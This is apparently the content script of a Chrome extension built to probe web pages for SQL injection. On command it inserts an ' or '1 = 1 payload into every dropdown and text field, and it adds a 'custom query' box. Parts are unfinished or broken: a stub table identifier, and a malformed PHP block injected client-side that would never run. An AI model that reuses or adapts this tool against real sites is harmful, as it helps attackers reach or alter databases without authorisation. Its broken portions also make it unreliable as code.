'use strict';

function dropdownInject(){
  var dropdowns = document.getElementsByTagName('select');

  //If there are no dropdowns to inject, stop
  if (dropdowns.length == 0){
    alert("There are no dropdowns to inject into.");
    return;
  }

  //Set injection tactic
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  for (var i = 0, l = dropdowns.length; i < l; i++) {
    dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
  }
  alert("Injected");
}

function tfInject(){
  var tfs = document.getElementsByTagName('input');
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  for (var i = 0; i < tfs.length; i++){
    tfs[i].value = injectionString;
  }
}

function idTable(){
  var listeners = getEventListeners();
  //WIP
}

function customScriptBox(){
  var originalHTML = document.getElementsByTagName('body');
  var scriptbox = 'Insert Query Here: <input id=\"customquery\"></input> <button id=\"csb\">Submit</button>';
  originalHTML[0].innerHTML = scriptbox + originalHTML[0].innerHTML; 
  document.getElementById('csb').addEventListener('click', runcs);
}

function runcs(){
  var query = document.getElementById('customquery');
  var phpblock1 = "<?php";
  var phpblock2 = "echo(did the php work);";
  var phpblock3 = "?>";
  var originalHTML = document.getElementsByTagName('body');
  originalHTML[0].innerHTML = phpblock1 + phpblock2 + phpblock3 + originalHTML[0].innerHTML;
  //alert(query.value);
  
}


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.message === "inject_to_dropdowns"){
      dropdownInject();
      chrome.runtime.sendMessage({"message": "Injection Completed"})
    }
    else if (request.message === "textfield_to_inject"){
      tfInject();
    }
    else if (request.message === "identify_table"){
      idTable();
    }
    else if (request.message === "custom_script_box"){
      customScriptBox();
    }
    else if (request.message === "destruction"){
      alert("Crush Kill Destory");
    }
  }
);